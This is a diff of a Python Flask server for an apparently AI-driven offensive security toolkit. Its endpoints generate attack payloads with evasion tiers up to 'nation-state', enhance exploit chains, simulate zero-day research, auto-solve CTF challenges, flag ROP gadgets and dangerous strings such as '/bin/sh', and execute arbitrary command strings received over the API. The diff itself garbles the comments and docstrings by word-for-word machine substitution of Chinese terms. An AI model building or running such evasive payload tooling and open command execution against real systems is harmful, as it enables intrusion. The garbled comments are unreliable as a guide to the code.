+            for chain in chain_results["attack_chains"][:2]:  # 说明：Enhance top 2 chains
                 enhanced_chain = chain.copy()
                 enhanced_stages = []
 
                 for stage in chain["stages"]:
                     enhanced_stage = stage.copy()
 
-                    # Try to generate exploit for this stage
+                    # Try 到 生成 利用 用于 this stage
                     vuln = stage.get("vulnerability", {})
                     cve_id = vuln.get("cve_id", "")
 
@@ -16291,7 +16291,7 @@ def discover_attack_chains():
 
 @app.route("/api/vuln-intel/threat-feeds", methods=["POST"])
 def threat_intelligence_feeds():
-    """Aggregate and correlate threat intelligence from multiple sources"""
+    """Aggregate 与 correlate threat intelligence 来自 multiple sources"""
     try:
         params = request.json
         indicators = params.get("indicators", [])
@@ -16319,12 +16319,12 @@ def threat_intelligence_feeds():
             "recommendations": []
         }
 
-        # Analyze each indicator
+        # 分析 each indicator
         cve_indicators = [i for i in indicators if i.startswith("CVE-")]
         ip_indicators = [i for i in indicators if i.replace(".", "").isdigit()]
         hash_indicators = [i for i in indicators if len(i) in [32, 40, 64] and all(c in "0123456789abcdef" for c in i.lower())]
 
-        # Process CVE indicators
+        # 进程 CVE indicators
         for cve_id in cve_indicators:
             try:
                 cve_analysis = cve_intelligence.analyze_cve_exploitability(cve_id)
@@ -16336,11 +16336,11 @@ def threat_intelligence_feeds():
                         "threat_level": cve_analysis.get("exploitability_level", "UNKNOWN")
                     })
 
-                    # Add to threat score
+                    # Add 到 threat 评分
                     exploit_score = cve_analysis.get("exploitability_score", 0)
                     correlation_results["threat_score"] += min(exploit_score, 100)
 
-                # Search for existing exploits
+                # Search 用于 existing exploits
                 exploits = cve_intelligence.search_existing_exploits(cve_id)
                 if exploits.get("success") and exploits.get("total_exploits", 0) > 0:
                     correlation_results["correlations"].append({
@@ -16354,9 +16354,9 @@ def threat_intelligence_feeds():
             except Exception as e:
                 logger.warning(f"Error analyzing CVE {cve_id}: {str(e)}")
 
-        # Process IP indicators (basic reputation check simulation)
+        # 进程 IP indicators (基础 reputation 检查 simulation)
         for ip in ip_indicators:
-            # Simulate threat intelligence lookup
+            # 说明：Simulate threat intelligence lookup
             correlation_results["correlations"].append({
                 "indicator": ip,
                 "type": "ip_reputation",
@@ -16365,10 +16365,10 @@ def threat_intelligence_feeds():
                     "geolocation": "unknown",
                     "associated_threats": []
                 },
-                "threat_level": "MEDIUM"  # Default for unknown IPs
+                "threat_level": "MEDIUM"  # 默认 用于 unknown IPs
             })
 
-        # Process hash indicators
+        # 进程 hash indicators
         for hash_val in hash_indicators:
             correlation_results["correlations"].append({
                 "indicator": hash_val,
@@ -16381,7 +16381,7 @@ def threat_intelligence_feeds():
                 "threat_level": "MEDIUM"
             })
 
-        # Calculate overall threat score and generate recommendations
+        # 计算 overall threat 评分 与 生成 recommendations
         total_indicators = len(indicators)
         if total_indicators > 0:
             correlation_results["threat_score"] = min(correlation_results["threat_score"] / total_indicators, 100)
@@ -16426,7 +16426,7 @@ def threat_intelligence_feeds():
 
 @app.route("/api/vuln-intel/zero-day-research", methods=["POST"])
 def zero_day_research():
-    """Automated zero-day vulnerability research using AI analysis"""
+    """Automated zero-day 漏洞 research using AI 分析"""
     try:
         params = request.json
         target_software = params.get("target_software", "")
@@ -16451,7 +16451,7 @@ def zero_day_research():
             "recommendations": []
         }
 
-        # Define research areas based on software type
+        # Define research areas based 在 software 类型
         common_research_areas = [
             "Input validation vulnerabilities",
             "Memory corruption issues",
@@ -16462,7 +16462,7 @@ def zero_day_research():
             "Logic flaws"
         ]
 
-        # Software-specific research areas
+        # 说明：Software-specific research areas
         web_research_areas = [
             "Cross-site scripting (XSS)",
             "SQL injection",
@@ -16479,7 +16479,7 @@ def zero_day_research():
             "Configuration weaknesses"
         ]
 
-        # Determine research areas based on target
+        # 判断 research areas based 在 目标
         target_lower = target_software.lower()
         if any(web_tech in target_lower for web_tech in ["apache", "nginx", "tomcat", "php", "node", "django"]):
             research_results["research_areas"] = common_research_areas + web_research_areas
@@ -16488,7 +16488,7 @@ def zero_day_research():
         else:
             research_results["research_areas"] = common_research_areas
 
-        # Simulate vulnerability discovery based on analysis depth
+        # Simulate 漏洞 发现 based 在 分析 depth
         vuln_count = {"quick": 2, "standard": 4, "comprehensive": 6}.get(analysis_depth, 4)
 
         for i in range(vuln_count):
@@ -16504,7 +16504,7 @@ def zero_day_research():
             }
             research_results["potential_vulnerabilities"].append(potential_vuln)
 
-        # Risk assessment
+        # 说明：Risk assessment
         high_risk_count = sum(1 for v in research_results["potential_vulnerabilities"] if v["severity"] in ["HIGH", "CRITICAL"])
         total_vulns = len(research_results["potential_vulnerabilities"])
 
@@ -16516,7 +16516,7 @@ def zero_day_research():
             "research_confidence": analysis_depth
         }
 
-        # Generate recommendations
+        # 生成 recommendations
         if high_risk_count > 0:
             research_results["recommendations"] = [
                 "Prioritize security testing in identified high-risk areas",
@@ -16533,7 +16533,7 @@ def zero_day_research():
                 "Regular security assessments recommended"
             ]
 
-        # Source code analysis simulation
+        # Source code 分析 simulation
         if source_code_url:
             research_results["source_code_analysis"] = {
                 "repository_url": source_code_url,
@@ -16565,7 +16565,7 @@ def zero_day_research():
 
 @app.route("/api/ai/advanced-payload-generation", methods=["POST"])
 def advanced_payload_generation():
-    """Generate advanced payloads with AI-powered evasion techniques"""
+    """生成 高级 payloads 使用 AI-powered evasion techniques"""
     try:
         params = request.json
         attack_type = params.get("attack_type", "rce")
@@ -16582,7 +16582,7 @@ def advanced_payload_generation():
 
         logger.info(f" Generating advanced {attack_type} payload with {evasion_level} evasion")
 
-        # Enhanced payload generation with contextual AI
+        # 增强 载荷 generation 使用 contextual AI
         target_info = {
             "attack_type": attack_type,
             "complexity": "advanced",
@@ -16591,13 +16591,13 @@ def advanced_payload_generation():
             "constraints": custom_constraints
         }
 
-        # Generate base payloads using existing AI system
+        # 生成 base payloads using existing AI 系统
         base_result = ai_payload_generator.generate_contextual_payload(target_info)
 
-        # Enhance with advanced techniques
+        # Enhance 使用 高级 techniques
         advanced_payloads = []
 
-        for payload_info in base_result.get("payloads", [])[:10]:  # Limit to 10 advanced payloads
+        for payload_info in base_result.get("payloads", [])[:10]:  # Limit 到 10 高级 payloads
             enhanced_payload = {
                 "payload": payload_info["payload"],
                 "original_context": payload_info["context"],
@@ -16606,9 +16606,9 @@ def advanced_payload_generation():
                 "deployment_methods": []
             }
 
-            # Apply evasion techniques based on level
+            # Apply evasion techniques based 在 level
             if evasion_level in ["advanced", "nation-state"]:
-                # Advanced encoding techniques
+                # 高级 encoding techniques
                 encoded_variants = [
                     {
                         "technique": "Double URL Encoding",
@@ -16626,7 +16626,7 @@ def advanced_payload_generation():
                 enhanced_payload["evasion_techniques"].extend(encoded_variants)
 
             if evasion_level == "nation-state":
-                # Nation-state level techniques
+                # 说明：Nation-state level techniques
                 advanced_techniques = [
                     {
                         "technique": "Polyglot Payload",
@@ -16643,7 +16643,7 @@ def advanced_payload_generation():
                 ]
                 enhanced_payload["evasion_techniques"].extend(advanced_techniques)
 
-            # Deployment methods
+            # 说明：Deployment methods
             enhanced_payload["deployment_methods"] = [
                 "Direct injection",
                 "Parameter pollution",
@@ -16654,7 +16654,7 @@ def advanced_payload_generation():
 
             advanced_payloads.append(enhanced_payload)
 
-        # Generate deployment instructions
+        # 生成 deployment instructions
         deployment_guide = {
             "pre_deployment": [
                 "Reconnaissance of target environment",
@@ -16702,12 +16702,12 @@ def advanced_payload_generation():
         }), 500
 
 # ============================================================================
-# CTF COMPETITION EXCELLENCE FRAMEWORK API ENDPOINTS (v8.0 ENHANCEMENT)
+# CTF COMPETITION EXCELLENCE 框架 API 端点 (v8.0 ENHANCEMENT)
 # ============================================================================
 
 @app.route("/api/ctf/create-challenge-workflow", methods=["POST"])
 def create_ctf_challenge_workflow():
-    """Create specialized workflow for CTF challenge"""
+    """创建 specialized workflow 用于 CTF challenge"""
     try:
         params = request.json
         challenge_name = params.get("name", "")
@@ -16720,7 +16720,7 @@ def create_ctf_challenge_workflow():
         if not challenge_name:
             return jsonify({"error": "Challenge name is required"}), 400
 
-        # Create CTF challenge object
+        # 创建 CTF challenge object
         challenge = CTFChallenge(
             name=challenge_name,
             category=category,
@@ -16730,7 +16730,7 @@ def create_ctf_challenge_workflow():
             target=target
         )
 
-        # Generate workflow
+        # 生成 workflow
         workflow = ctf_manager.create_ctf_challenge_workflow(challenge)
 
         logger.info(f" CTF workflow created for {challenge_name} | Category: {category} | Difficulty: {difficulty}")
@@ -16747,7 +16747,7 @@ def create_ctf_challenge_workflow():
 
 @app.route("/api/ctf/auto-solve-challenge", methods=["POST"])
 def auto_solve_ctf_challenge():
-    """Attempt to automatically solve a CTF challenge"""
+    """Attempt 到 automatically solve a CTF challenge"""
     try:
         params = request.json
         challenge_name = params.get("name", "")
@@ -16760,7 +16760,7 @@ def auto_solve_ctf_challenge():
         if not challenge_name:
             return jsonify({"error": "Challenge name is required"}), 400
 
-        # Create CTF challenge object
+        # 创建 CTF challenge object
         challenge = CTFChallenge(
             name=challenge_name,
             category=category,
@@ -16770,7 +16770,7 @@ def auto_solve_ctf_challenge():
             target=target
         )
 
-        # Attempt automated solving
+        # 说明：Attempt automated solving
         result = ctf_automator.auto_solve_challenge(challenge)
 
         logger.info(f" CTF auto-solve attempted for {challenge_name} | Status: {result['status']}")
@@ -16787,7 +16787,7 @@ def auto_solve_ctf_challenge():
 
 @app.route("/api/ctf/team-strategy", methods=["POST"])
 def create_ctf_team_strategy():
-    """Create optimal team strategy for CTF competition"""
+    """创建 optimal team 策略 用于 CTF competition"""
     try:
         params = request.json
         challenges_data = params.get("challenges", [])
@@ -16796,7 +16796,7 @@ def create_ctf_team_strategy():
         if not challenges_data:
             return jsonify({"error": "Challenges data is required"}), 400
 
-        # Convert challenge data to CTFChallenge objects
+        # 转换 challenge data 到 CTFChallenge objects
         challenges = []
         for challenge_data in challenges_data:
             challenge = CTFChallenge(
@@ -16809,7 +16809,7 @@ def create_ctf_team_strategy():
             )
             challenges.append(challenge)
 
-        # Generate team strategy
+        # 生成 team 策略
         strategy = ctf_coordinator.optimize_team_strategy(challenges, team_skills)
 
         logger.info(f" CTF team strategy created | Challenges: {len(challenges)} | Team members: {len(team_skills)}")
@@ -16827,7 +16827,7 @@ def create_ctf_team_strategy():
 
 @app.route("/api/ctf/suggest-tools", methods=["POST"])
 def suggest_ctf_tools():
-    """Suggest optimal tools for CTF challenge based on description and category"""
+    """Suggest optimal 工具 用于 CTF challenge based 在 description 与 category"""
     try:
         params = request.json
         description = params.get("description", "")
@@ -16836,11 +16836,11 @@ def suggest_ctf_tools():
         if not description:
             return jsonify({"error": "Challenge description is required"}), 400
 
-        # Get tool suggestions
+        # 获取 工具 suggestions
         suggested_tools = ctf_tools.suggest_tools_for_challenge(description, category)
         category_tools = ctf_tools.get_category_tools(f"{category}_recon")
 
-        # Get tool commands
+        # 获取 工具 命令
         tool_commands = {}
         for tool in suggested_tools:
             try:
@@ -16864,7 +16864,7 @@ def suggest_ctf_tools():
 
 @app.route("/api/ctf/cryptography-solver", methods=["POST"])
 def ctf_cryptography_solver():
-    """Advanced cryptography challenge solver with multiple attack methods"""
+    """高级 cryptography challenge solver 使用 multiple attack methods"""
     try:
         params = request.json
         cipher_text = params.get("cipher_text", "")
@@ -16885,9 +16885,9 @@ def ctf_cryptography_solver():
             "next_steps": []
         }
 
-        # Cipher type identification
+        # Cipher 类型 identification
         if cipher_type == "unknown":
-            # Basic cipher identification heuristics
+            # 基础 cipher identification heuristics
             if re.match(r'^[0-9a-fA-F]+$', cipher_text.replace(' ', '')):
                 results["analysis_results"].append("Possible hexadecimal encoding")
                 results["recommended_tools"].extend(["hex", "xxd"])
@@ -16900,7 +16900,7 @@ def ctf_cryptography_solver():
                 results["analysis_results"].append("Possible substitution cipher")
                 results["recommended_tools"].extend(["frequency-analysis", "substitution-solver"])
 
-        # Hash identification
+        # 说明：Hash identification
         hash_patterns = {
             32: "MD5",
             40: "SHA1",
@@ -16914,7 +16914,7 @@ def ctf_cryptography_solver():
             results["analysis_results"].append(f"Possible {hash_type} hash")
             results["recommended_tools"].extend(["hashcat", "john", "hash-identifier"])
 
-        # Frequency analysis for substitution ciphers
+        # Frequency 分析 用于 substitution ciphers
         if cipher_type in ["substitution", "caesar", "vigenere"] or "substitution" in results["analysis_results"]:
             char_freq = {}
             for char in cipher_text.upper():
@@ -16926,12 +16926,12 @@ def ctf_cryptography_solver():
                 results["analysis_results"].append(f"Most frequent character: {most_common} ({char_freq[most_common]} occurrences)")
                 results["next_steps"].append("Try substituting most frequent character with 'E'")
 
-        # ROT/Caesar cipher detection
+        # 说明：ROT/Caesar cipher detection
         if cipher_type == "caesar" or len(set(cipher_text.upper().replace(' ', ''))) <= 26:
             results["recommended_tools"].append("rot13")
             results["next_steps"].append("Try all ROT values (1-25)")
 
-        # RSA-specific analysis
+        # RSA-specific 分析
         if cipher_type == "rsa" or "rsa" in additional_info.lower():
             results["recommended_tools"].extend(["rsatool", "factordb", "yafu"])
             results["next_steps"].extend([
@@ -16940,7 +16940,7 @@ def ctf_cryptography_solver():
                 "Check for common modulus attacks"
             ])
 
-        # Vigenère cipher analysis
+        # Vigenère cipher 分析
         if cipher_type == "vigenere" or "vigenere" in additional_info.lower():
             results["recommended_tools"].append("vigenere-solver")
             results["next_steps"].extend([
@@ -16962,7 +16962,7 @@ def ctf_cryptography_solver():
 
 @app.route("/api/ctf/forensics-analyzer", methods=["POST"])
 def ctf_forensics_analyzer():
-    """Advanced forensics challenge analyzer with multiple investigation techniques"""
+    """高级 取证 challenge analyzer 使用 multiple investigation techniques"""
     try:
         params = request.json
         file_path = params.get("file_path", "")
@@ -16984,14 +16984,14 @@ def ctf_forensics_analyzer():
             "next_steps": []
         }
 
-        # Basic file analysis
+        # 基础 文件 分析
         try:
-            # File command
+            # 文件 命令
             file_result = subprocess.run(['file', file_path], capture_output=True, text=True, timeout=30)
             if file_result.returncode == 0:
                 results["file_info"]["type"] = file_result.stdout.strip()
 
-                # Determine file category and suggest tools
+                # 判断 文件 category 与 suggest 工具
                 file_type = file_result.stdout.lower()
                 if "image" in file_type:
                     results["recommended_tools"].extend(["exiftool", "steghide", "stegsolve", "zsteg"])
@@ -17024,7 +17024,7 @@ def ctf_forensics_analyzer():
         except Exception as e:
             results["file_info"]["error"] = str(e)
 
-        # Metadata extraction
+        # 说明：Metadata extraction
         try:
             exif_result = subprocess.run(['exiftool', file_path], capture_output=True, text=True, timeout=30)
             if exif_result.returncode == 0:
@@ -17032,7 +17032,7 @@ def ctf_forensics_analyzer():
         except Exception as e:
             results["metadata"]["exif_error"] = str(e)
 
-        # Binwalk analysis for hidden files
+        # Binwalk 分析 用于 hidden 文件
         if extract_hidden:
             try:
                 binwalk_result = subprocess.run(['binwalk', '-e', file_path], capture_output=True, text=True, timeout=60)
@@ -17047,9 +17047,9 @@ def ctf_forensics_analyzer():
                     "error": str(e)
                 })
 
-        # Steganography checks
+        # 说明：Steganography checks
         if check_steganography:
-            # Check for common steganography tools
+            # 检查 用于 常见 steganography 工具
             steg_tools = ["steghide", "zsteg", "outguess"]
             for tool in steg_tools:
                 try:
@@ -17071,11 +17071,11 @@ def ctf_forensics_analyzer():
                         "error": str(e)
                     })
 
-        # Strings analysis
+        # Strings 分析
         try:
             strings_result = subprocess.run(['strings', file_path], capture_output=True, text=True, timeout=30)
             if strings_result.returncode == 0:
-                # Look for interesting strings (flags, URLs, etc.)
+                # Look 用于 interesting strings (flags, URLs, etc.)
                 interesting_strings = []
                 for line in strings_result.stdout.split('\n'):
                     if any(keyword in line.lower() for keyword in ['flag', 'password', 'key', 'secret', 'http', 'ftp']):
@@ -17084,7 +17084,7 @@ def ctf_forensics_analyzer():
                 if interesting_strings:
                     results["hidden_data"].append({
                         "tool": "strings",
-                        "interesting_strings": interesting_strings[:20]  # Limit to first 20
+                        "interesting_strings": interesting_strings[:20]  # Limit 到 第一 20
                     })
         except Exception as e:
             results["hidden_data"].append({
@@ -17105,11 +17105,11 @@ def ctf_forensics_analyzer():
 
 @app.route("/api/ctf/binary-analyzer", methods=["POST"])
 def ctf_binary_analyzer():
-    """Advanced binary analysis for reverse engineering and pwn challenges"""
+    """高级 二进制 分析 用于 逆向工程 与 pwn challenges"""
     try:
         params = request.json
         binary_path = params.get("binary_path", "")
-        analysis_depth = params.get("analysis_depth", "comprehensive")  # basic, comprehensive, deep
+        analysis_depth = params.get("analysis_depth", "comprehensive")  # 基础, 综合, deep
         check_protections = params.get("check_protections", True)
         find_gadgets = params.get("find_gadgets", True)
 
@@ -17128,13 +17128,13 @@ def ctf_binary_analyzer():
             "exploitation_hints": []
         }
 
-        # Basic file information
+        # 基础 文件 information
         try:
             file_result = subprocess.run(['file', binary_path], capture_output=True, text=True, timeout=30)
             if file_result.returncode == 0:
                 results["file_info"]["type"] = file_result.stdout.strip()
 
-                # Determine architecture and suggest tools
+                # 判断 architecture 与 suggest 工具
                 file_output = file_result.stdout.lower()
                 if "x86-64" in file_output or "x86_64" in file_output:
                     results["file_info"]["architecture"] = "x86_64"
@@ -17147,14 +17147,14 @@ def ctf_binary_analyzer():
         except Exception as e:
             results["file_info"]["error"] = str(e)
 
-        # Security protections check
+        # 安全 protections 检查
         if check_protections:
             try:
                 checksec_result = subprocess.run(['checksec', '--file', binary_path], capture_output=True, text=True, timeout=30)
                 if checksec_result.returncode == 0:
                     results["security_protections"]["checksec"] = checksec_result.stdout
 
-                    # Parse protections and provide exploitation hints
+                    # 解析 protections 与 provide exploitation hints
                     output = checksec_result.stdout.lower()
                     if "no canary found" in output:
                         results["exploitation_hints"].append("Stack canary disabled - buffer overflow exploitation possible")
@@ -17167,13 +17167,13 @@ def ctf_binary_analyzer():
             except Exception as e:
                 results["security_protections"]["error"] = str(e)
 
-        # Strings analysis
+        # Strings 分析
         try:
             strings_result = subprocess.run(['strings', binary_path], capture_output=True, text=True, timeout=30)
             if strings_result.returncode == 0:
                 strings_output = strings_result.stdout.split('\n')
 
-                # Categorize interesting strings
+                # 说明：Categorize interesting strings
                 interesting_categories = {
                     "functions": [],
                     "format_strings": [],
@@ -17187,29 +17187,29 @@ def ctf_binary_analyzer():
                     if not string:
                         continue
 
-                    # Look for function names
+                    # Look 用于 function names
                     if any(func in string for func in ['printf', 'scanf', 'gets', 'strcpy', 'system', 'execve']):
                         interesting_categories["functions"].append(string)
 
-                    # Look for format strings
+                    # Look 用于 format strings
                     if '%' in string and any(fmt in string for fmt in ['%s', '%d', '%x', '%n']):
                         interesting_categories["format_strings"].append(string)
 
-                    # Look for file paths
+                    # Look 用于 文件 paths
                     if string.startswith('/') or '\\' in string:
                         interesting_categories["file_paths"].append(string)
 
-                    # Look for potential flags
+                    # Look 用于 potential flags
                     if any(keyword in string.lower() for keyword in ['flag', 'ctf', 'key', 'password']):
                         interesting_categories["potential_flags"].append(string)
 
-                    # Look for system calls
+                    # Look 用于 系统 calls
                     if string in ['sh', 'bash', '/bin/sh', '/bin/bash', 'cmd.exe']:
                         interesting_categories["system_calls"].append(string)
 
                 results["strings_analysis"] = interesting_categories
 
-                # Add exploitation hints based on strings
+                # Add exploitation hints based 在 strings
                 if interesting_categories["functions"]:
                     dangerous_funcs = ['gets', 'strcpy', 'sprintf', 'scanf']
                     found_dangerous = [f for f in dangerous_funcs if any(f in s for s in interesting_categories["functions"])]
@@ -17223,7 +17223,7 @@ def ctf_binary_analyzer():
         except Exception as e:
             results["strings_analysis"]["error"] = str(e)
 
-        # ROP gadgets search
+        # 说明：ROP gadgets search
         if find_gadgets and analysis_depth in ["comprehensive", "deep"]:
             try:
                 ropgadget_result = subprocess.run(['ROPgadget', '--binary', binary_path, '--only', 'pop|ret'], capture_output=True, text=True, timeout=60)
@@ -17235,7 +17235,7 @@ def ctf_binary_analyzer():
                         if 'pop' in line and 'ret' in line:
                             useful_gadgets.append(line.strip())
 
-                    results["gadgets"] = useful_gadgets[:20]  # Limit to first 20 gadgets
+                    results["gadgets"] = useful_gadgets[:20]  # Limit 到 第一 20 gadgets
 
                     if useful_gadgets:
                         results["exploitation_hints"].append(f"Found {len(useful_gadgets)} ROP gadgets - ROP chain exploitation possible")
@@ -17244,24 +17244,24 @@ def ctf_binary_analyzer():
             except Exception as e:
                 results["gadgets"] = [f"Error finding gadgets: {str(e)}"]
 
-        # Function analysis with objdump
+        # Function 分析 使用 objdump
         if analysis_depth in ["comprehensive", "deep"]:
             try:
                 objdump_result = subprocess.run(['objdump', '-t', binary_path], capture_output=True, text=True, timeout=30)
                 if objdump_result.returncode == 0:
                     functions = []
                     for line in objdump_result.stdout.split('\n'):
-                        if 'F .text' in line:  # Function in text section
+                        if 'F .text' in line:  # Function 在 text section
                             parts = line.split()
                             if len(parts) >= 6:
                                 func_name = parts[-1]
                                 functions.append(func_name)
 
-                    results["interesting_functions"] = functions[:50]  # Limit to first 50 functions
+                    results["interesting_functions"] = functions[:50]  # Limit 到 第一 50 functions
             except Exception as e:
                 results["interesting_functions"] = [f"Error analyzing functions: {str(e)}"]
 
-        # Add tool recommendations based on findings
+        # Add 工具 recommendations based 在 findings
         if results["exploitation_hints"]:
             results["recommended_tools"].extend(["pwntools", "gdb-peda", "one-gadget"])
 
@@ -17280,12 +17280,12 @@ def ctf_binary_analyzer():
         return jsonify({"error": f"Server error: {str(e)}"}), 500
 
 # ============================================================================
-# ADVANCED PROCESS MANAGEMENT API ENDPOINTS (v10.0 ENHANCEMENT)
+# 高级 进程 MANAGEMENT API 端点 (v10.0 ENHANCEMENT)
 # ============================================================================
 
 @app.route("/api/process/execute-async", methods=["POST"])
 def execute_command_async():
-    """Execute command asynchronously using enhanced process management"""
+    """执行 命令 asynchronously using 增强 进程 management"""
     try:
         params = request.json
         command = params.get("command", "")
@@ -17294,7 +17294,7 @@ def execute_command_async():
         if not command:
             return jsonify({"error": "Command parameter is required"}), 400
 
-        # Execute command asynchronously
+        # 执行 命令 asynchronously
         task_id = enhanced_process_manager.execute_command_async(command, context)
 
         logger.info(f" Async command execution started | Task ID: {task_id}")
@@ -17312,7 +17312,7 @@ def execute_command_async():
 
 @app.route("/api/process/get-task-result/<task_id>", methods=["GET"])
 def get_async_task_result(task_id):
-    """Get result of asynchronous task"""
+    """获取 结果 的 asynchronous task"""
     try:
         result = enhanced_process_manager.get_task_result(task_id)
 
@@ -17333,7 +17333,7 @@ def get_async_task_result(task_id):
 
 @app.route("/api/process/pool-stats", methods=["GET"])
 def get_process_pool_stats():
-    """Get process pool statistics and performance metrics"""
+    """获取 进程 pool 统计 与 performance 指标"""
     try:
         stats = enhanced_process_manager.get_comprehensive_stats()
 
@@ -17350,7 +17350,7 @@ def get_process_pool_stats():
 
 @app.route("/api/process/cache-stats", methods=["GET"])
 def get_cache_stats():
-    """Get advanced cache statistics"""
+    """获取 高级 缓存 统计"""
     try:
         cache_stats = enhanced_process_manager.cache.get_stats()
 
@@ -17367,7 +17367,7 @@ def get_cache_stats():
 
 @app.route("/api/process/clear-cache", methods=["POST"])
 def clear_process_cache():
-    """Clear the advanced cache"""
+    """Clear the 高级 缓存"""
     try:
         enhanced_process_manager.cache.clear()
 
@@ -17384,7 +17384,7 @@ def clear_process_cache():
 
 @app.route("/api/process/resource-usage", methods=["GET"])
 def get_resource_usage():
-    """Get current system resource usage and trends"""
+    """获取 current 系统 resource usage 与 trends"""
     try:
         current_usage = enhanced_process_manager.resource_monitor.get_current_usage()
         usage_trends = enhanced_process_manager.resource_monitor.get_usage_trends()
@@ -17403,13 +17403,13 @@ def get_resource_usage():
 
 @app.route("/api/process/performance-dashboard", methods=["GET"])
 def get_performance_dashboard():
-    """Get performance dashboard data"""
+    """获取 performance dashboard data"""
     try:
         dashboard_data = enhanced_process_manager.performance_dashboard.get_summary()
         pool_stats = enhanced_process_manager.process_pool.get_pool_stats()
         resource_usage = enhanced_process_manager.resource_monitor.get_current_usage()
 
-        # Create comprehensive dashboard
+        # 创建 综合 dashboard
         dashboard = {
             "performance_summary": dashboard_data,
             "process_pool": pool_stats,
@@ -17436,7 +17436,7 @@ def get_performance_dashboard():
 
 @app.route("/api/process/terminate-gracefully/<int:pid>", methods=["POST"])
 def terminate_process_gracefully(pid):
-    """Terminate process with graceful degradation"""
+    """Terminate 进程 使用 graceful degradation"""
     try:
         params = request.json or {}
         timeout = params.get("timeout", 30)
@@ -17465,13 +17465,13 @@ def terminate_process_gracefully(pid):
 
 @app.route("/api/process/auto-scaling", methods=["POST"])
 def configure_auto_scaling():
-    """Configure auto-scaling settings"""
+    """配置 auto-scaling settings"""
     try:
         params = request.json
         enabled = params.get("enabled", True)
         thresholds = params.get("thresholds", {})
 
-        # Update auto-scaling configuration
+        # 更新 auto-scaling 配置
         enhanced_process_manager.auto_scaling_enabled = enabled
 
         if thresholds:
@@ -17491,10 +17491,10 @@ def configure_auto_scaling():
 
 @app.route("/api/process/scale-pool", methods=["POST"])
 def manual_scale_pool():
-    """Manually scale the process pool"""
+    """Manually scale the 进程 pool"""
     try:
         params = request.json
-        action = params.get("action", "")  # "up" or "down"
+        action = params.get("action", "")  # "up" 或 "down"
         count = params.get("count", 1)
 
         if action not in ["up", "down"]:
@@ -17511,7 +17511,7 @@ def manual_scale_pool():
                 message = f"Scaled up by {count} workers"
             else:
                 return jsonify({"error": f"Cannot scale up: would exceed max workers ({max_workers})"}), 400
-        else:  # down
+        else:  # 说明：down
             min_workers = enhanced_process_manager.process_pool.min_workers
             if current_workers - count >= min_workers:
                 enhanced_process_manager.process_pool._scale_down(count)
@@ -17535,12 +17535,12 @@ def manual_scale_pool():
 
 @app.route("/api/process/health-check", methods=["GET"])
 def process_health_check():
-    """Comprehensive health check of the process management system"""
+    """综合 健康 检查 的 the 进程 management 系统"""
     try:
-        # Get all system stats
+        # 获取 全部 系统 stats
         comprehensive_stats = enhanced_process_manager.get_comprehensive_stats()
 
-        # Determine overall health
+        # 判断 overall 健康
         resource_usage = comprehensive_stats["resource_usage"]
         pool_stats = comprehensive_stats["process_pool"]
         cache_stats = comprehensive_stats["cache"]
@@ -17548,7 +17548,7 @@ def process_health_check():
         health_score = 100
         issues = []
 
-        # CPU health
+        # CPU 健康
         if resource_usage["cpu_percent"] > 95:
             health_score -= 30
             issues.append("Critical CPU usage")
@@ -17556,7 +17556,7 @@ def process_health_check():
             health_score -= 15
             issues.append("High CPU usage")
 
-        # Memory health
+        # 内存 健康
         if resource_usage["memory_percent"] > 95:
             health_score -= 25
             issues.append("Critical memory usage")
@@ -17564,7 +17564,7 @@ def process_health_check():
             health_score -= 10
             issues.append("High memory usage")
 
-        # Disk health
+        # Disk 健康
         if resource_usage["disk_percent"] > 98:
             health_score -= 20
             issues.append("Critical disk usage")
@@ -17572,19 +17572,19 @@ def process_health_check():
             health_score -= 5
             issues.append("High disk usage")
 
-        # Process pool health
+        # 进程 pool 健康
         if pool_stats["queue_size"] > 50:
             health_score -= 15
             issues.append("High task queue backlog")
 
-        # Cache health
+        # 缓存 健康
         if cache_stats["hit_rate"] < 30:
             health_score -= 10
             issues.append("Low cache hit rate")
 
         health_score = max(0, health_score)
 
-        # Determine status
+        # 判断 状态
         if health_score >= 90:
             status = "excellent"
         elif health_score >= 75:
@@ -17604,7 +17604,7 @@ def process_health_check():
             "recommendations": []
         }
 
-        # Add recommendations based on issues
+        # Add recommendations based 在 issues
         if "High CPU usage" in issues:
             health_report["recommendations"].append("Consider reducing concurrent processes or upgrading CPU")
         if "High memory usage" in issues:
@@ -17626,16 +17626,16 @@ def process_health_check():
         return jsonify({"error": f"Server error: {str(e)}"}), 500
 
 # ============================================================================
-# BANNER AND STARTUP CONFIGURATION
+# BANNER 与 STARTUP 配置
 # ============================================================================
 
 # ============================================================================
-# INTELLIGENT ERROR HANDLING API ENDPOINTS
+# 智能 错误 HANDLING API 端点
 # ============================================================================
 
 @app.route("/api/error-handling/statistics", methods=["GET"])
 def get_error_statistics():
-    """Get error handling statistics"""
+    """获取 错误 handling 统计"""
     try:
         stats = error_handler.get_error_statistics()
         return jsonify({
@@ -17649,14 +17649,14 @@ def get_error_statistics():
 
 @app.route("/api/error-handling/test-recovery", methods=["POST"])
 def test_error_recovery():
-    """Test error recovery system with simulated failures"""
+    """测试 错误 恢复 系统 使用 simulated failures"""
     try:
         data = request.get_json()
         tool_name = data.get("tool_name", "nmap")
         error_type = data.get("error_type", "timeout")
         target = data.get("target", "example.com")
 
-        # Simulate an error for testing
+        # Simulate an 错误 用于 测试
         if error_type == "timeout":
             exception = TimeoutError("Simulated timeout error")
         elif error_type == "permission_denied":
@@ -17672,7 +17672,7 @@ def test_error_recovery():
             "attempt_count": 1
         }
 
-        # Get recovery strategy
+        # 获取 恢复 策略
         recovery_strategy = error_handler.handle_tool_failure(tool_name, exception, context)
 
         return jsonify({
@@ -17695,7 +17695,7 @@ def test_error_recovery():
 
 @app.route("/api/error-handling/fallback-chains", methods=["GET"])
 def get_fallback_chains():
-    """Get available fallback tool chains"""
+    """获取 available 降级 工具 chains"""
     try:
         operation = request.args.get("operation", "")
         failed_tools = request.args.getlist("failed_tools")
@@ -17723,7 +17723,7 @@ def get_fallback_chains():
 
 @app.route("/api/error-handling/execute-with-recovery", methods=["POST"])
 def execute_with_recovery_endpoint():
-    """Execute a command with intelligent error handling and recovery"""
+    """执行 a 命令 使用 智能 错误 handling 与 恢复"""
     try:
         data = request.get_json()
         tool_name = data.get("tool_name", "")
@@ -17735,7 +17735,7 @@ def execute_with_recovery_endpoint():
         if not tool_name or not command:
             return jsonify({"error": "tool_name and command are required"}), 400
 
-        # Execute command with recovery
+        # 执行 命令 使用 恢复
         result = execute_command_with_recovery(
             tool_name=tool_name,
             command=command,
@@ -17756,7 +17756,7 @@ def execute_with_recovery_endpoint():
 
 @app.route("/api/error-handling/classify-error", methods=["POST"])
